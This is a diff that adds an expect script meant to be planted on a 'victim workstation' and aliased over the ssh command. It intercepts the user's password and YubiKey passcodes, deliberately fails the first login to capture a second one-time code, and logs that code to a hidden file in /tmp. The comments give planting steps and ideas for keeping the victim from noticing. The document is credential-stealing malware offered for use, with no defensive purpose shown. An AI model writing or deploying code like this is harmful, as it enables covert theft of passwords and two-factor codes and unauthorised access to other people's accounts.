@@ -1,0 +1,81 @@
+#!/usr/bin/expect
+
+# Steps:
+#
+# Copy this file and ssh_snoop.sh to victim workstation, renamed to something less obvious
+# On victim workstation run alias ssh="/path/to/this/file.expect \$@ 2>/dev/null"
+#     (the stderr redirect prevents a 10-line error message when the user exits ssh)
+# Ensure your alias links to the correct path for this file
+# Ensure the "spawn" command below links to the correct path for the renamed ssh_snoop.sh
+
+# Things to improve:
+#
+# - passcode1 is echoed after passcode2 entered 
+# - passcode2 does not steam out to tty, we only see passcode1 come out after a delay in one fell swoop
+# - when entering passcode2 the user may notice the "key" cursor instead of the normal cursor
+#
+# - if user gives options for ssh like ssh -v, we go right to running the real ssh and do not record creds
+#
+# - if user gives a bad password for the valid ssh, our log will record their 3rd password as the yubicode
+#    - I could probably rewrite the script to not be sequential but looped, to handle this properly
+
+# CURRENT:
+# Maybe I don't need to write a fake ssh, I just feed a bad passcode to the real one?
+# This would let us handle options being passed like ssh -v -l ....
+
+set logfile /tmp/.data
+set timeout 4
+set arg1 [lindex $argv 0];
+set arg2 [lindex $argv 1];
+set arg3 [lindex $argv 2];
+
+spawn -noecho ~/ssh_snoop.sh $arg1 $arg2 $arg3 
+
+expect "Password:*"
+stty -echo
+expect_user -timeout 3600 -re "(.*)\[\r\n]"
+stty echo
+send "$expect_out(1,string)\r"
+
+expect "*Passcode:*"
+# if you stty -echo here passcode isn't seen until you hit enter which is too noticeable
+expect_user -timeout 3600 -re "(.*)\[\r\n]"
+# even if you stty -echo here the passcode will double-show
+# if you do a send -noecho, script just ends
+set passcode1 $expect_out(1,string)
+# We have to send something, so let's just send an empty line
+send "\r"
+
+# this line is absolutely needed
+expect "Authentication*" 
+
+expect "*Password:*"
+stty -echo
+expect_user -timeout 3600 -re "(.*)\[\r\n]"
+stty echo
+send "$expect_out(1,string)\r"
+
+expect "*Passcode:*"
+stty -echo
+expect_user -timeout 3600 -re "(.*)\[\r\n]"
+stty echo
+set passcode2 $expect_out(1,string)
+log_file $logfile
+send_log "$passcode2\n" 
+log_file
+# Can't seem to find a perfect way to hide this
+# Current best way: hide the second passcode as it is typed
+#     this will look odd to users, as normally they expect their yubicode to be spit out to the tty
+#     users will see a yubicode once it's fully entered, all in one fell swoop though
+#     also, when entering the passcode the cursor will be a "key" symbol for mac term users
+#     similar to how it looks for password inputs
+#set send_slow {1 .01}
+#set force_conservative 1
+#send -s "$passcode1\r"
+send "$passcode1\r"
+#set force_conservative 0
+
+while 1 {
+    interact 
+}
+
